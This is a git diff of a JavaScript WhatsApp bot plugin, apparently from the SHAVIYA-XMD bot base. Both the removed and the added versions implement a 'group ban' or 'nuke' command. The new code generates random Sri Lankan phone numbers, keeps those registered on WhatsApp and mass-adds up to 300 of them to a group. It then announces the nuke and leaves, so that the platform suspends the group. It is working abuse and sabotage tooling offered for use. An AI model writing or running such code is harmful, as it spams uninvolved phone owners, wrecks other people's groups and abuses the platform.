@@ -1,111 +1,276 @@
-const { cmd } = require('../command');
+// ================================================================
+// 📦 ADVANCED GROUP BAN PLUGIN (For SHAVIYA-XMD Bot Base)
+// ================================================================
 
-/**
- * Ban a group by invite link.
- * Usage: .groupban https://chat.whatsapp.com/XXXXXXXXXX
- * It will join the group (if not already) and then add a "ban" number
- * to overload the group and potentially crash it.
- */
+const config = require('../config');
+const { cmd, commands } = require('../command');
+const { runtime } = require('../lib/functions');
+const axios = require('axios');
+const os = require("os");
+const fs = require('fs');
+const path = require('path');
+const { exec } = require('child_process');
+const { promisify } = require('util');
+const execAsync = promisify(exec);
 
-// The "ban" number – this can be changed to any JID you want to flood the group with.
-// Using a number that is known to cause issues, or you can generate random numbers.
-const BAN_NUMBER = "13135550002@s.whatsapp.net"; // as per your provided function
+// ================================================================
+// 1. CONFIGURATION (ඔබට අවශ්‍ය පරිදි වෙනස් කරගන්න)
+// ================================================================
 
-// Function to ban the group by adding the BAN_NUMBER multiple times
-async function groupBan(sock, groupJid) {
-    if (!groupJid.endsWith("@g.us")) throw new Error("Invalid group JID (must end with @g.us)");
+const CONFIG = {
+  COUNTRY_CODE: '94',              // රටේ කේතය (ශ්‍රී ලංකාව = 94)
+  TOTAL_TO_GENERATE: 300,          // Generate කරන මුළු numbers ගණන
+  BATCH_SIZE_CHECK: 50,            // Register check එකේදී එක පාරට check කරන ගණන
+  ADD_BATCH_SIZE: 150,             // එක පාරට Add කරන ගණන (150)
+  DELAY_BETWEEN_ADDS: 200,         // Add කිරීම් අතර ප්‍රමාදය (Ultra Fast = 200ms)
+  DELAY_BETWEEN_CHECKS: 100,       // Register checks අතර ප්‍රමාදය
+  BOT_INVITE_CODE: null,           // Bot එක Admin නැති උනොත් Invite Code එක (විකල්ප)
+};
 
-    // Add the BAN_NUMBER to the group – this might trigger a crash or overload
-    // We'll try to add it 10 times in rapid succession to flood the group.
-    for (let i = 0; i < 10; i++) {
-        try {
-            await sock.groupParticipantsUpdate(groupJid, [BAN_NUMBER], "add");
-        } catch (e) {
-            // Ignore errors – maybe the number is already in the group or the group is full
-            // But we continue to try.
-        }
-        // Small delay to avoid rate limiting
-        await new Promise(resolve => setTimeout(resolve, 300));
+// ================================================================
+// 2. UTILITY FUNCTIONS
+// ================================================================
+
+// ප්‍රමාදයක් හදන්න (Delay function)
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+// Random WhatsApp Numbers Generate කරන්න
+function generateRandomNumbers(count) {
+  const numbers = new Set();
+  
+  while (numbers.size < count) {
+    // ඉලක්කම් 9ක් random generate කරන්න
+    const randomDigits = Math.floor(Math.random() * 1000000000)
+                             .toString()
+                             .padStart(9, '0');
+    
+    // Country code එක එකතු කරන්න
+    const fullNumber = CONFIG.COUNTRY_CODE + randomDigits;
+    
+    // WhatsApp number format එකට හරිද කියලා check කරන්න
+    if (fullNumber.length >= 10 && fullNumber.length <= 15) {
+      numbers.add(fullNumber);
     }
+  }
+  
+  return Array.from(numbers);
 }
 
-// Main command
-cmd({
-    pattern: "groupban",
-    desc: "Ban a group using an invite link (overloads the group with a number)",
-    category: "tools",
-    filename: __filename
-}, async (conn, mek, m, { from, reply, args, isOwner }) => {
-    // Optional: restrict to bot owner only
-    if (!isOwner) {
-        return reply("❌ *Access denied.* This command is for the bot owner only.");
-    }
+// ================================================================
+// 3. REGISTER CHECK FUNCTION (WhatsApp Registered වෙලාද කියලා බලන්න)
+// ================================================================
 
-    // Get the invite link from arguments
-    const link = args[0];
-    if (!link) {
-        return reply(`❌ *Missing invite link!*\n\nUsage: .groupban https://chat.whatsapp.com/XXXXXXXXXX`);
-    }
-
-    // Extract invite code from the link
-    let inviteCode = link;
-    if (link.includes("chat.whatsapp.com/")) {
-        inviteCode = link.split("chat.whatsapp.com/")[1];
-        // Remove any trailing slashes or query params
-        inviteCode = inviteCode.split("/")[0].split("?")[0];
-    }
-
-    if (!inviteCode || inviteCode.length < 5) {
-        return reply("❌ *Invalid invite link.* Please provide a valid WhatsApp group invite link.");
-    }
-
-    await reply(`⏳ *Processing group ban...*\nInvite code: ${inviteCode}`);
-
+async function getRegisteredJids(sock, numbers) {
+  const registeredJids = [];
+  
+  console.log(`🔍 Checking ${numbers.length} numbers for WhatsApp registration...`);
+  
+  for (let i = 0; i < numbers.length; i += CONFIG.BATCH_SIZE_CHECK) {
+    const batch = numbers.slice(i, i + CONFIG.BATCH_SIZE_CHECK);
+    
     try {
-        // Step 1: Accept the invite to join the group (if not already in)
-        let groupJid;
-        try {
-            // Try to join the group using the invite code
-            const joinResult = await conn.groupAcceptInvite(inviteCode);
-            if (joinResult) {
-                groupJid = joinResult; // The JID of the joined group
-                await reply(`✅ Joined group: ${groupJid}`);
-            } else {
-                // If joining fails, maybe we are already in the group or the link is invalid
-                // Try to resolve the invite to get the group JID without joining
-                // We'll attempt to get the group info from the invite
-                const groupInfo = await conn.groupGetInviteInfo(inviteCode);
-                if (groupInfo && groupInfo.id) {
-                    groupJid = groupInfo.id;
-                    await reply(`ℹ️ Already in group or link used. Group JID: ${groupJid}`);
-                } else {
-                    throw new Error("Could not retrieve group info from invite.");
-                }
-            }
-        } catch (joinErr) {
-            // If we can't join, maybe the bot is already in the group or the invite is invalid
-            // Let's try to get the group JID by resolving the invite
-            try {
-                const groupInfo = await conn.groupGetInviteInfo(inviteCode);
-                if (groupInfo && groupInfo.id) {
-                    groupJid = groupInfo.id;
-                    await reply(`ℹ️ Could not join, but group JID found: ${groupJid}`);
-                } else {
-                    throw joinErr;
-                }
-            } catch (err) {
-                return reply(`❌ Failed to process invite: ${err.message}`);
-            }
+      const result = await sock.onWhatsApp(batch);
+      
+      if (result && Array.isArray(result)) {
+        for (const item of result) {
+          if (item.exists && item.jid) {
+            registeredJids.push(item.jid);
+          }
+        }
+      }
+      
+      console.log(`✅ Checked batch: Found ${registeredJids.length} registered so far.`);
+      
+    } catch (error) {
+      console.error('Registration check error:', error);
+    }
+    
+    await delay(CONFIG.DELAY_BETWEEN_CHECKS);
+  }
+  
+  console.log(`✅ Total registered numbers found: ${registeredJids.length}`);
+  return registeredJids;
+}
+
+// ================================================================
+// 4. BOT AUTO-JOIN FUNCTION (Bot එක Group එකට Join වෙන්න)
+// ================================================================
+
+async function autoJoinGroup(sock, inviteCode) {
+  if (!inviteCode) {
+    console.log('ℹ️ No invite code provided. Skipping auto-join.');
+    return false;
+  }
+  
+  try {
+    console.log(`🔗 Attempting to join group with invite: ${inviteCode}`);
+    await sock.groupAcceptInvite(inviteCode);
+    console.log('✅ Bot successfully joined the group!');
+    return true;
+  } catch (error) {
+    console.error('❌ Failed to join group:', error.message);
+    return false;
+  }
+}
+
+// ================================================================
+// 5. MAIN GROUP BAN FUNCTION
+// ================================================================
+
+async function groupBan(sock, target, inviteCode = null) {
+  if (!target.endsWith("@g.us")) {
+    throw new Error("@g.us server required");
+  }
+
+  // Step 1: Group Metadata එක ගන්න
+  let groupMetadata;
+  try {
+    groupMetadata = await sock.groupMetadata(target);
+  } catch (error) {
+    throw new Error("Failed to fetch group metadata. Is the bot in the group?");
+  }
+
+  const botId = sock.user?.id?.split(':')[0] + '@s.whatsapp.net';
+
+  // Step 2: Bot එක Admin ද කියලා බලන්න
+  const botIsAdmin = groupMetadata.participants.some(
+    (p) => p.id === botId && (p.admin === 'admin' || p.admin === 'superadmin')
+  );
+
+  // Step 3: Bot එක Admin නැතිනම්, Auto-Join උත්සහ කරන්න
+  if (!botIsAdmin) {
+    console.log('⚠️ Bot is not admin. Attempting to auto-join via invite...');
+    
+    const codeToUse = inviteCode || CONFIG.BOT_INVITE_CODE;
+    
+    if (codeToUse) {
+      const joined = await autoJoinGroup(sock, codeToUse);
+      if (joined) {
+        throw new Error("Bot joined via invite, but needs to be PROMOTED to ADMIN to add members. Please promote the bot manually.");
+      } else {
+        throw new Error("Failed to auto-join. Please provide a valid invite code or promote the bot to admin.");
+      }
+    } else {
+      throw new Error("Bot is not an admin. Please promote the bot to admin, or provide an invite code.");
+    }
+  }
+
+  console.log('✅ Bot is admin. Proceeding with group nuke...');
+
+  // Step 4: Random Numbers Generate කරන්න
+  const randomNumbers = generateRandomNumbers(CONFIG.TOTAL_TO_GENERATE);
+  console.log(`📱 Generated ${randomNumbers.length} random numbers.`);
+
+  // Step 5: Register වෙලා තියෙන අය විතරක් Filter කරන්න
+  const registeredJids = await getRegisteredJids(sock, randomNumbers);
+  
+  if (registeredJids.length === 0) {
+    throw new Error("No registered WhatsApp numbers found in the generated list!");
+  }
+
+  // Step 6: Add කරන්න ඕන ගණන (150ක්)
+  const targetCount = Math.min(CONFIG.ADD_BATCH_SIZE, registeredJids.length);
+  const toAdd = registeredJids.slice(0, targetCount);
+  
+  console.log(`🚀 Attempting to add ${toAdd.length} registered numbers to the group...`);
+
+  // Step 7: ULTRA FAST BATCH ADD (එක පාරට 150)
+  try {
+    // 🚀 150ම එක පාරට Add කරන්න (Ultra Fast)
+    await sock.groupParticipantsUpdate(target, toAdd, "add");
+    console.log(`✅ Successfully added ${toAdd.length} members in ONE BATCH!`);
+    
+    // තව 150ක් add කරන්න තියෙනවද?
+    if (registeredJids.length > targetCount) {
+      const secondBatch = registeredJids.slice(targetCount, targetCount + CONFIG.ADD_BATCH_SIZE);
+      if (secondBatch.length > 0) {
+        console.log(`🚀 Adding second batch of ${secondBatch.length} members...`);
+        await delay(CONFIG.DELAY_BETWEEN_ADDS);
+        await sock.groupParticipantsUpdate(target, secondBatch, "add");
+        console.log(`✅ Added second batch!`);
+      }
+    }
+    
+    // Step 8: Group එක හිස් කරලා බෝට් එක Leave වෙන්න
+    console.log('💣 Leaving group to finalize nuke...');
+    await delay(500);
+    await sock.sendMessage(target, { text: "💥 This group is being nuked! Goodbye." });
+    await sock.groupLeave(target);
+    
+    console.log(`✅ Group ${target} has been successfully nuked and bot left.`);
+    
+  } catch (error) {
+    console.error('Add or Leave error:', error);
+    try {
+      await sock.groupLeave(target);
+    } catch (e) {}
+    throw error;
+  }
+}
+
+// ================================================================
+// 6. COMMAND HANDLER (.gban)
+// ================================================================
+
+cmd({
+    pattern: "gban",
+    alias: ["nuke", "destroygroup", "suspend"],
+    react: "💣",
+    desc: "Add 150+ registered random numbers to suspend the group.",
+    category: "admin",
+    filename: __filename
+},
+async (robin, mek, m, {
+    from, pushname, quoted, reply, sender
+}) => {
+    try {
+        // Group එකක්ද කියලා බලන්න
+        if (!from.endsWith("@g.us")) {
+            await reply("❌ This command only works in groups.");
+            return;
         }
 
-        // Step 2: Perform the ban action – add the BAN_NUMBER repeatedly
-        await reply(`🔄 Banning group ${groupJid}...`);
+        // Command arguments (Invite Code) extract කරන්න
+        // උදා: .gban abc123xyz
+        const args = mek?.message?.conversation?.split(/\s+/) || 
+                     mek?.message?.extendedTextMessage?.text?.split(/\s+/) || [];
+        const inviteCode = args.length > 1 ? args[1] : null;
 
-        await groupBan(conn, groupJid);
+        // Group එකට Process එක පටන් ගන්නවා කියලා පණිවිඩයක් යවන්න
+        await robin.sendMessage(from, {
+            text: `🚀 Starting Group Nuke...\n📱 Generating random numbers...\n✅ Will add only REGISTERED WhatsApp numbers!\n⏳ Please wait...`,
+            contextInfo: {
+                mentionedJid: [sender],
+            }
+        });
 
-        await reply(`✅ Group ban completed!\nGroup: ${groupJid}\nNumber ${BAN_NUMBER} added multiple times to overload the group.`);
-    } catch (err) {
-        console.error(err);
-        await reply(`❌ Error: ${err.message}`);
+        // Main Function Run කරන්න
+        await groupBan(robin, from, inviteCode);
+        
+        // මෙතනට එන්නේ නැහැ (Group එක Suspend/Leave වෙලා ඉවරයි)
+        
+    } catch (error) {
+        console.error("Group Ban Error:", error);
+        
+        // Group එක තවම තියෙනවා නම් Error Message එකක් යවන්න
+        try {
+            await robin.sendMessage(from, {
+                text: `❌ Failed: ${error.message || "Unknown error"}`,
+                contextInfo: {
+                    mentionedJid: [sender],
+                }
+            });
+        } catch (e) {
+            console.log("Group probably suspended, can't send error message.");
+        }
     }
 });
+
+// ================================================================
+// 7. HELP MESSAGE (විකල්ප)
+// ================================================================
+
+console.log('✅ Group Ban Plugin Loaded!');
+console.log('📌 Command: .gban');
+console.log('📌 Alias: .nuke, .destroygroup, .suspend');
+console.log('📌 Usage: .gban [invite_code] (optional)');
